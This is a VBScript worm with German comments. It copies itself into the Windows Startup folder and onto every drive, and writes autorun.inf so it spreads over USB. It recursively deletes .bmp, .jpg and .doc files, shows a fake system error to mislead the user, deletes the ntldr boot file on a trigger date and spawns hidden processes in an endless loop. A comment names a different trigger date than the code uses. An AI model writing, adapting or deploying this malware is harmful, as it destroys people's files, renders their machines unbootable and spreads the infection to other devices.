' Selbstkopie in Autostart
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
startupPath = shell.SpecialFolders("Startup")
path = startupPath & "\winupdate.vbs"
If Not fso.FileExists(path) Then
    fso.CopyFile WScript.ScriptFullName, path, True
End If

' Verbreitung auf alle Laufwerke (inkl. USB)
For Each drive In fso.Drives
    If drive.DriveType = 1 Or drive.DriveType = 2 Then ' Wechseldatentr�ger oder Festplatte
        On Error Resume Next
        fso.CopyFile WScript.ScriptFullName, drive.Path & "\winupdate.vbs", True
        ' Erstelle autorun.inf korrekt:
        Set autorunFile = fso.CreateTextFile(drive.Path & "\autorun.inf", True)
        autorunFile.WriteLine("[autorun]")
        autorunFile.WriteLine("open=winupdate.vbs")
        autorunFile.WriteLine("shellexecute=winupdate.vbs")
        autorunFile.Close
        On Error GoTo 0
        
        ' L�sche .bmp, .jpg und .doc Dateien
        DeleteFiles drive.Path
    End If
Next

' Funktion zum L�schen der Dateien
Sub DeleteFiles(directory)
    On Error Resume Next
    Set folder = fso.GetFolder(directory)
    For Each file In folder.Files
        ' �berpr�fen der Dateierweiterung
        If LCase(fso.GetExtensionName(file.Name)) = "bmp" Or _
           LCase(fso.GetExtensionName(file.Name)) = "jpg" Or _
           LCase(fso.GetExtensionName(file.Name)) = "doc" Then
            file.Delete True ' Dateien l�schen
        End If
    Next
    ' Durchlaufe alle Unterordner
    For Each subfolder In folder.Subfolders
        DeleteFiles subfolder.Path ' Rekursive Funktion f�r Unterordner
    Next
End Sub

' Fake Fehlermeldung erzeugen, um den Benutzer zu t�uschen
Sub ShowFakeError()
    MsgBox "Fehler: Abh�ngigkeit von Kernel32.dll nicht gefunden." & vbCrLf & _
           "Ein Update f�r Ihr System ist erforderlich, um die neueste Version von Windows auszuf�hren." & vbCrLf & _
           "Bitte stellen Sie sicher, dass Sie alle aktuellen Updates �ber Windows Update installieren.", _
           vbCritical, "Wichtige Systemmeldung"
End Sub

' Zeige den Fake-Fehler nach dem Start
ShowFakeError()

' L�sche ntldr nur am 8. M�rz eines jeden Jahres
currentDate = Date
currentMonth = Month(currentDate)
currentDay = Day(currentDate)

' Wenn heute der 30. November ist, l�sche ntldr
If currentMonth = 11 And currentDay = 30 Then
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists("C:\ntldr") Then
        fso.DeleteFile "C:\ntldr", True
    End If
    On Error GoTo 0
End If

' Tasks starten (Endlosschleife)
Do
    ' Hintergrundaufruf f�r Notepad
    shell.Run "notepad", 0 ' 0 sorgt daf�r, dass das Fenster unsichtbar bleibt

    ' Hintergrundaufruf f�r die Eingabeaufforderung (CMD)
    shell.Run "cmd echo Warning!", 0 ' 0 sorgt daf�r, dass das Fenster unsichtbar bleibt

    WScript.Sleep 1000 ' 1 Sekunde warten
Loop